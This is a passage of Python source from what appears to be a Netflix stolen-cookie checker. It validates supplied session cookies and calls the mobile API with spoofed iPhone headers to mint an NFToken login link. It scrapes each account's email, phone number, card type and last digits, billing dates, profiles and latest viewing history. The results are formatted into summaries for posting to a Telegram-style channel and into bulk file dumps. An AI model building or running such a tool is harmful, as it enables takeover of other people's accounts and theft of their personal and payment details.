                "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
                "device_type": "NFAPPL-02-",
                "esn": encoded_esn,
                "idiom": "phone",
                "iosVersion": "15.8.5",
                "isTablet": "false",
                "languages": "en-IN",
                "locale": "en-IN",
                "maxDeviceWidth": "375",
                "model": "saget",
                "modelType": "IPHONE9-3",
                "odpAware": "true",
                "path": '["account","token","default"]',
                "pathFormat": "graph",
                "pixelDensity": "2.0",
                "progressive": "false",
                "responseFormat": "json"
            }

            # Prepare headers
            headers = {
                "x-netflix.request.attempt": "1",
                "x-netflix.client.idiom": "phone",
                "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
                "x-netflix.context.app-version": "15.48.1",
                "x-netflix.argo.translated": "true",
                "x-netflix.context.form-factor": "phone",
                "x-netflix.context.sdk-version": "2012.4",
                "accept": "*/*",
                "x-netflix.client.appversion": "15.48.1",
                "accept-encoding": "gzip, deflate, br",
                "x-netflix.context.max-device-width": "375",
                "x-netflix.context.ab-tests": "",
                "user-agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
                "x-netflix.tracing.cl.useractionid": "B31524CE-31B3-4311-9567-CD9C6A0B595D",
                "cookie": cookie_input,
                "x-netflix.client.type": "argo",
                "x-netflix.client.ftl.esn": esn,
                "x-netflix.context.locales": "en-IN",
                "x-netflix.context.top-level-uuid": "555E8F04-E042-4D9E-AF5C-C5FAC55548FE",
                "x-netflix.client.iosversion": "15.8.5",
                "accept-language": "en-IN;q=1",
                "x-netflix.argo.abtests": "",
                "x-netflix.context.os-version": "15.8.5",
                "x-netflix.request.client.context": '{"appState":"foreground"}',
                "x-netflix.context.ui-flavor": "argo",
                "x-netflix.argo.nfnsm": "9",
                "x-netflix.context.pixel-density": "2.0",
                "x-netflix.request.toplevel.uuid": "555E8F04-E042-4D9E-AF5C-C5FAC55548FE",
                "x-netflix.request.client.timezoneid": "US/Pacific"
            }

            # Make API request
            logger.info(f"Making NFToken API call with ESN: {esn}")
            response = self._get(base_url, params=params, headers=headers, timeout=30)

            if response.status_code == 200:
                try:
                    data = json.loads(response.text)
                    token = data["value"]["account"]["token"]["default"]["token"]
                    netflix_url = f"https://www.netflix.com/account?nftoken={token}"
                    self.nftoken_info = {"token": token, "netflix_url": netflix_url, "status": "success"}
                    logger.info("✅ Token successfully generated!")
                    return True
                except (KeyError, json.JSONDecodeError) as e:
                    logger.error(f"Error extracting token: {e}")
                    logger.error(f"Response content: {response.text[:500]}...")
                    self.nftoken_info = {"status": "error", "error": "No token found in response"}
                    return False
            else:
                logger.error(f"❌ NFToken API Error: {response.status_code}")
                logger.error(f"Response: {response.text[:500]}...")
                self.nftoken_info = {"status": "error", "error": f"API Error: {response.status_code}"}
                return False

        except (requests.exceptions.RequestException, TypeError, ValueError) as e:
            logger.error(f"Error generating token: {e}")
            self.nftoken_info = {"status": "error", "error": str(e)}
            return False

    def get_nftoken_only(self, cookie_input):
        """Fast validation: load cookies, get token, no account info fetch."""
        self.load_cookies_from_input(cookie_input)
        if not self.check_cookies_validity():
            return None
        if self.get_nftoken(cookie_input):
            return self.nftoken_info.get('token')
        return None

    def get_next_billing_from_account(self):
        """Extract next billing date from account page"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Referer': 'https://www.netflix.com/simplemember/managepaymentinfo', 'Connection': 'keep-alive',
            }

            response = self._get('https://www.netflix.com/account', headers=headers, timeout=30)
            if response.status_code == 200:
                next_billing_match = re.search(r'>Next payment:\s*([^<]+)</p>', response.text)
                if next_billing_match:
                    return next_billing_match.group(1).strip()
            return "N/A"
        except (requests.exceptions.RequestException, AttributeError, re.error) as e:
            logger.error(f"Error extracting next billing date: {e}")
            return "N/A"

    def fetch_profile_activity(self, guid, name):
        """Fetch viewing activity for a single profile and return the most recent item."""
        url = f"https://www.netflix.com/settings/viewed/{guid}"
        try:
            response = self._get(url, timeout=15)
            if response.status_code != 200:
                return None
            # Extract the embedded JSON from the page
            match = re.search(r'netflix\.reactContext\s*=\s*({.*?});\s*</script>', response.text, re.DOTALL)
            if not match:
                return None
                
            json_str = match.group(1)
            # Fix JavaScript hex escapes (invalid in strict JSON) -> \x20 becomes \u0020
            json_str = re.sub(r'\\x([0-9a-fA-F]{2})', r'\\u00\1', json_str)
            # Strip other invalid JSON escapes (like \') to prevent JSONDecodeError
            json_str = re.sub(r'\\([^"\\/bfnrtu])', r'\1', json_str)
            
            data = json.loads(json_str)
            va_model = data.get('models', {}).get('vaModel', {}).get('data', {})
            viewed_items = va_model.get('viewedItems', [])
            if not viewed_items:
                return None
            # Find the item with the highest timestamp (most recent)
            latest_item = max(viewed_items, key=lambda x: x.get('date', 0))
            # Build title string
            if 'seriesTitle' in latest_item:
                title = f"{latest_item['seriesTitle']}: {latest_item.get('episodeTitle', '')}"
            else:
                title = latest_item.get('title', 'Unknown title')
            return {
                'profile_name': name,
                'title': title,
                'timestamp': latest_item.get('date', 0),
                'date': None  # will be formatted later
            }
        except Exception as e:
            logger.warning(f"Error fetching activity for profile {guid}: {e}")
            return None

    def fetch_latest_activity_all_profiles(self):
        """
        Fetch viewing activity for all profiles and return the single most recent watch.
        Returns a dict: {'profile_name': str, 'title': str, 'date': str, 'timestamp': int}
        or None if no activity found.
        """
        profiles = self.account_data.get('Profiles', [])
        profile_guids = self.account_data.get('ProfilesGuids', [])
        if not profiles or not profile_guids or len(profiles) != len(profile_guids):
            # Fallback: try to get profiles from account_data or fetch from /account/profiles
            # For simplicity, we'll just use what we have
            if not profile_guids:
                return None

        latest = None
        latest_ts = 0

        # Use thread pool to fetch concurrently (max 5 profiles)
        with ThreadPoolExecutor(max_workers=min(5, len(profile_guids))) as executor:
            futures = []
            for guid, name in zip(profile_guids, profiles):
                futures.append(executor.submit(self.fetch_profile_activity, guid, name))
            for future in futures:
                result = future.result()
                if result and result['timestamp'] > latest_ts:
                    latest = result
                    latest_ts = result['timestamp']

        if latest:
            # Convert timestamp to readable date
            dt = datetime.fromtimestamp(latest_ts / 1000, tz=timezone.utc)
            latest['date'] = dt.strftime('%d/%m/%y %H:%M')
        return latest

    def get_account_info(self, cookie_input=None, fetch_nftoken=True):
        """Get comprehensive account information from Netflix using multiple methods"""
        try:
            headers = {
                'Host': 'www.netflix.com', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'User-Agent': self.user_agent
            }

            response = self._get('https://www.netflix.com/youraccount', headers=headers, timeout=30)

            if response.status_code != 200:
                logger.error(f"HTTP Error: {response.status_code}. Cookies may be invalid.")
                return False

            content = response.text

            self.account_data = self.extract_account_data(content)
            self.payment_info = self.extract_payment_data_from_account_page(content)

            email_verified = self.extract_email_verification_status(content)
            if email_verified is not None:
                self.account_data['EmailVerified'] = email_verified

            # Fetch additional details from the security page, this is more reliable
            self.fetch_security_page_info()

            # Fallback if security page fails or does not contain the info
            if 'PhoneVerified' not in self.account_data:
                phone_verified = self.extract_phone_verification_status(content)  # Fallback to main page
                if phone_verified is not None:
                    self.account_data['PhoneVerified'] = phone_verified

            if 'DetailedPhoneNumber' not in self.account_data:
                phone_details = self.extract_phone_details_from_account_info(content)
                self.account_data.update(phone_details)
                if 'DetailedPhoneNumber' not in self.account_data:
                    phone_number = self.extract_phone_number(content)  # Final fallback
                    if phone_number:
                        self.account_data['DetailedPhoneNumber'] = phone_number

            extra_members = self.extract_extra_members(content)
            self.account_data['ExtraMembers'] = extra_members

            # Profiles already extracted in extract_account_data, but if not, fetch from /profiles/manage
            if 'Profiles' not in self.account_data or not self.account_data['Profiles']:
                profiles_result = self.extract_profiles_info()
                if profiles_result:
                    self.account_data['Profiles'] = profiles_result
                    self.account_data['ProfileCount'] = str(len(profiles_result))
            else:
                self.account_data['ProfileCount'] = str(len(self.account_data.get('Profiles', [])))

            # Determine account status using improved logic
            self.account_data['AccountStatus'] = self.determine_account_status(content)

            # Fetch latest viewing activity across all profiles
            latest_activity = self.fetch_latest_activity_all_profiles()
            if latest_activity:
                self.account_data['LatestActivity'] = latest_activity

            if fetch_nftoken:
                self.get_nftoken(cookie_input)

            if 'NextBillingDate' not in self.account_data or self.account_data['NextBillingDate'] == 'N/A':
                self.account_data['NextBillingDate'] = self.get_next_billing_from_account()

            required_fields = ['Plan', 'AccountStatus', 'Country', 'MemberSince', 'Email', 'Profiles', 'ProfileCount', 'NextBillingDate', 'DisplayLanguage']

            for field in required_fields:
                if field not in self.account_data or not self.account_data[field]:
                    self.account_data[field] = 'N/A'

            return True

        except (requests.exceptions.RequestException, AttributeError, KeyError, TypeError, ValueError) as e:
            logger.error(f"Error getting account info: {e}")
            return False

    def get_account_info_for_file_check(self, cookie_input=None):
        """Wrapper for getting account info optimized for file checks (skip unnecessary calls if possible)"""
        return self.get_account_info(cookie_input, fetch_nftoken=False)

    def _result_category(self) -> tuple[str, str]:
        account_status = str(self.account_data.get('AccountStatus', 'Unknown')).strip().lower()
        if account_status == 'active':
            return "🟢", "Active"
        if account_status in {'hold', 'on hold'}:
            return "🟡", "On Hold"
        if account_status in {'inactive', 'cancelled', 'expired', 'former_member'}:
            return "🔴", "Expired"
        return "❓", "Unknown"

    def _billing_status_text(self, category: str, next_billing: str) -> str:
        if category == "Active":
            if next_billing and next_billing != "N/A":
                return f"Active - next billing {next_billing}"
            return "Active"
        if category == "On Hold":
            return "Payment on hold"
        if category == "Expired":
            return "Expired or cancelled"
        return "Unknown"

    def format_account_info(self):
        """Formats account info into a clear community-facing summary."""
        if not self.account_data:
            return f"{pe('error')} <b>Failed to extract account information. Cookies may be invalid.</b>"

        # --- 1. Gather all data points ---
        status_emoji, category = self._result_category()
        status_emoji_html = {
            "🟢": pe('green'),
            "🟡": pe('yellow'),
            "🔴": pe('red'),
            "❓": pe('question'),
        }.get(status_emoji, html.escape(status_emoji))

        country_display = get_country_display(self.account_data.get('Country', 'N/A'), premium=True)
        member_since = html.escape(self.account_data.get('MemberSince', 'N/A'))

        # Fix plan display - decode unicode escapes
        plan_raw = self.account_data.get('Plan', 'N/A')
        plan = html.escape(decode_unicode_escapes(plan_raw))

        # Payment Info - Skip if N/A
        payment_str = "N/A"
        payment_methods = self.payment_info.get('PaymentMethods', [])
        if payment_methods:
            method = payment_methods[0]
            cc_type = html.escape(method.get('type', 'CARD'))
            display = html.escape(method.get('display', '****'))
            method_type = html.escape(method.get('method_type', ''))

            # Extract last 4 digits from display
            last_four = ''.join(filter(str.isdigit, display))

            if last_four and last_four != 'N/A':
                payment_str = f"{cc_type.upper()} - {last_four} ({len(payment_methods)} CC)"
            elif method_type and method_type != 'N/A':
                payment_str = f"{method_type.upper()} ({len(payment_methods)} methods)"
            else:
                payment_str = f"{cc_type.upper()} ({len(payment_methods)} CC)"

        next_billing_raw = self.account_data.get('NextBillingDate', 'N/A')
        next_billing = html.escape(next_billing_raw)
        billing_status = html.escape(self._billing_status_text(category, next_billing_raw))

        screens_raw = self.account_data.get('MaxStreams', 'N/A')
        screens = html.escape(str(screens_raw))
        video_quality_raw = self.account_data.get('VideoQuality', 'N/A')
        video_quality = html.escape(decode_unicode_escapes(str(video_quality_raw)))

        profiles = self.account_data.get('Profiles', [])
        profile_names = html.escape(", ".join(profiles)) if profiles else 'N/A'

        # Fix display language - use the new extraction method
        display_language_raw = self.account_data.get('DisplayLanguage', 'N/A')
        display_language = html.escape(decode_unicode_escapes(display_language_raw))

        # Email Info
        email_raw = self.account_data.get('Email', 'N/A')
        email = html.escape(decode_unicode_escapes(email_raw))
        email_verified = self.account_data.get('EmailVerified')
        email_status_str = f"{pe('success')} Verified" if email_verified else f"{pe('error')} Not Verified" if email_verified is False else ""

        # Phone Info
        phone_number = self.account_data.get('DetailedPhoneNumber')
        phone_str = ""
        if phone_number and phone_number != 'N/A':
            # The phone number from the API often includes the country code.
            phone_verified = self.account_data.get('PhoneVerified')
            phone_status_str = f"{pe('success')} Verified" if phone_verified else f"{pe('error')} Not Verified" if phone_verified is False else ""
            phone_str = f"{pe('mobile')} <b>Phone:</b> <code>{html.escape(phone_number)}</code>      {phone_status_str}"

        creds_str = ""
        if self.credentials_found:
            creds_str = f"\n{pe('key')} <b>Credential:</b> <code>{html.escape(self.credentials_found)}</code>"

        # Extra fields
        extra_members = self.account_data.get('ExtraMembers')
        extra_members_str = f"{pe('users')} <b>Extra Members:</b> {extra_members}" if extra_members and extra_members != 'N/A' else ""

        addons = self.account_data.get('AddOns')
        addons_str = f"{pe('plus')} <b>Add-ons:</b> {addons}" if addons and addons != 'N/A' else ""

        pause_status = self.account_data.get('PauseStatus')
        pause_end = self.account_data.get('PauseEndDate')
        pause_str = ""
        if pause_status:
            pause_str = f"{pe('hourglass')} <b>Pause:</b> {pause_status}"
            if pause_end:
                pause_str += f" until {pause_end}"

        cancel_status = self.account_data.get('CancellationStatus')
        cancel_date = self.account_data.get('CancellationDate')
        cancel_str = ""
        if cancel_status:
            cancel_str = f"{pe('stop')} <b>Cancellation:</b> {cancel_status}"
            if cancel_date:
                cancel_str += f" on {cancel_date}"

        bundle_type = self.account_data.get('BundleType')
        bundle_str = f"{pe('box')} <b>Bundle:</b> {bundle_type}" if bundle_type and bundle_type != 'DEFAULT' else ""

        gift_balance = self.account_data.get('GiftBalance')
        gift_str = f"{pe('gift')} <b>Gift Balance:</b> {gift_balance}" if gift_balance and gift_balance != 'N/A' else ""

        # Latest activity
        latest_act = self.account_data.get('LatestActivity')
        latest_str = ""
        if latest_act:
            latest_str = f"{pe('tv')} <b>Latest Watch:</b> {latest_act['profile_name']} watched \"{latest_act['title']}\" on {latest_act['date']}"

        # --- 2. Assemble the message ---
        last_checked = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        lines = ["[ <b>ACCOUNT SUMMARY</b> ]"]
        lines.append(f"{status_emoji_html} <b>Category:</b> {category}")

        # Only add lines that don't have N/A values
        if country_display != 'N/A':
            lines.append(f"{pe('world')} <b>Region:</b> {country_display}")

        if member_since != 'N/A':
            lines.append(f"{pe('clock')} <b>Member Since:</b> {member_since}")

        if plan != 'N/A':
            lines.append(f"{pe('crown')} <b>Plan:</b> {plan}")

        if screens != 'N/A':
            screen_line = f"{pe('tv')} <b>Screens:</b> {screens}"
            if video_quality != 'N/A':
                screen_line += f" ({video_quality})"
            lines.append(screen_line)

        if payment_str != 'N/A':
            lines.append(f"{pe('card')} <b>Payment:</b> {payment_str}")

        lines.append(f"{pe('receipt')} <b>Billing Status:</b> {billing_status}")

        if next_billing != 'N/A':
            lines.append(f"{pe('calendar')} <b>Next Billing:</b> {next_billing}")

        lines.append(f"{pe('clock')} <b>Last Checked:</b> {last_checked}")

        if profile_names != 'N/A':
            lines.append(f"{pe('mask')} <b>Profiles:</b> {profile_names}")

        if display_language != 'N/A':
            lines.append(f"{pe('globe')} <b>Display Language:</b> {display_language}")

        if email != 'N/A':
            lines.append(f"{pe('email')} <b>Email:</b> {email}  {email_status_str}")

        if phone_str:
            lines.append(phone_str)

        if creds_str:
            lines.append(creds_str)

        # New fields
        if extra_members_str:
            lines.append(extra_members_str)
        if addons_str:
            lines.append(addons_str)
        if pause_str:
            lines.append(pause_str)
        if cancel_str:
            lines.append(cancel_str)
        if bundle_str:
            lines.append(bundle_str)
        if gift_str:
            lines.append(gift_str)
        if latest_str:
            lines.append(latest_str)

        # Footer
        lines.append(f"\n{pe('pc')} <b>Made By :</b> @Lmao_Noob")
        lines.append(f"{pe('rocket')} <b>Join us :</b> @{CHANNEL_USERNAME}")

        return "\n".join(lines)

    def format_account_info_for_file(self):
        """Format account information for file output - FULL INFO without NFToken"""
        if not self.account_data:
            return "| ❌ Failed to extract account information"

        _, category = self._result_category()
        email = self.account_data.get('Email', 'N/A')
        country = get_country_display(self.account_data.get('Country', 'N/A'))

        # Ensure country is clean for processing
        if not country or country == 'N/A':
            country = "Unknown"

        plan = self.account_data.get('Plan', 'N/A')
        max_streams = self.account_data.get('MaxStreams', 'N/A')
        video_quality = self.account_data.get('VideoQuality', 'N/A')
        next_billing_raw = self.account_data.get('NextBillingDate', 'N/A')
        next_billing = next_billing_raw
        billing_status = self._billing_status_text(category, next_billing)
        last_checked = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        payment_str = "N/A"
        payment_methods = self.payment_info.get('PaymentMethods', [])
        if payment_methods:
            method = payment_methods[0]
            cc_type = method.get('type', 'N/A')
            display = method.get('display', 'N/A')
            method_type = method.get('method_type', 'N/A')
            payment_str = f'"{cc_type}" "{display}" "{method_type}"'

        phone_str = "N/A"
        phone_number = self.account_data.get('DetailedPhoneNumber')
        if phone_number and phone_number != 'N/A':
            phone_country_code = self.account_data.get('PhoneCountryCode', 'N/A')
            phone_str = f"{phone_number} ({phone_country_code})"

        creds_str = ""
        if self.credentials_found:
            creds_str = f" | Credential = {self.credentials_found}"

        profiles = self.account_data.get('Profiles', [])
        profile_count = self.account_data.get('ProfileCount', '0')
        profile_names = ", ".join(profiles) if profiles else 'N/A'

        return (
            f"| Category = {category} | Region = {country} | Plan = {plan} "
            f"| Screens = {max_streams} | Video Quality = {video_quality} "
            f"| Billing Status = {billing_status} | Last Checked = {last_checked} "
            f"| Email = {email} | Next Billing = {next_billing} | Payment = {payment_str} "
            f"| Phone = {phone_str}{creds_str} | Profiles ({profile_count}) = {profile_names}"
        )